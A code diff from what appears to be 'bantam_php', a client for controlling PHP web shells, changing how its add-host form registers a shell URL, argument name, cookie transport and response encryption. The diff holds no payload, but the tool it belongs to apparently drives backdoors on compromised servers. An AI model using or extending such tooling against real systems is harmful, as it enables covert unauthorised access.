@@ -18,7 +18,7 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public static string g_CallingShellUrl = null;
+        public static string g_CallingShellUrl = string.Empty;
 
         /// <summary>
         /// 
@@ -52,6 +52,7 @@ namespace bantam_php
 
             txtBoxShellUrl.Text = shellUrl;
             txtBoxArgName.Text = varName;
+            g_CallingShellUrl = shellUrl;
 
             if (BantamMain.Shells.ContainsKey(shellUrl)) {
                 checkBoxResponseEncryption.Checked = BantamMain.Shells[shellUrl].encryptResponse;
@@ -125,25 +126,29 @@ namespace bantam_php
                 return;
             }
 
+            if (BantamMain.Shells.ContainsKey(g_CallingShellUrl)) {
+                Program.g_BantamMain.guiCallbackRemoveShellURL(g_CallingShellUrl);
+                BantamMain.Shells.Remove(g_CallingShellUrl);
+            }
+
             if (BantamMain.Shells.ContainsKey(shellURL)) {
                 Program.g_BantamMain.guiCallbackRemoveShellURL(shellURL);
                 BantamMain.Shells.Remove(shellURL);
-
-                BantamMain.Shells.Add(shellURL, new ShellInfo());
-                BantamMain.Shells[shellURL].requestArgName = txtBoxArgName.Text;
-
-                if (comboBoxVarType.Text == "cookie") {
-                    BantamMain.Shells[shellURL].sendDataViaCookie = true;
-                }
-
-                if (checkBoxResponseEncryption.Checked == false) {
-                    BantamMain.Shells[shellURL].encryptResponse = false;
-                    BantamMain.Shells[shellURL].encryptResponse = false;
-                }
-
-                Program.g_BantamMain.InitializeShellData(shellURL);
-                Program.g_BantamMain.updateHostForm.Hide();
             }
+
+            BantamMain.Shells.Add(shellURL, new ShellInfo());
+            BantamMain.Shells[shellURL].requestArgName = txtBoxArgName.Text;
+
+            if (comboBoxVarType.Text == "cookie") {
+                BantamMain.Shells[shellURL].sendDataViaCookie = true;
+            }
+
+            if (checkBoxResponseEncryption.Checked == false) {
+                BantamMain.Shells[shellURL].encryptResponse = false;
+                BantamMain.Shells[shellURL].encryptResponse = false;
+            }
+            Program.g_BantamMain.InitializeShellData(shellURL);
+            Program.g_BantamMain.updateHostForm.Hide();
         }
 
         private void AddHost_Shown(object sender, EventArgs e)
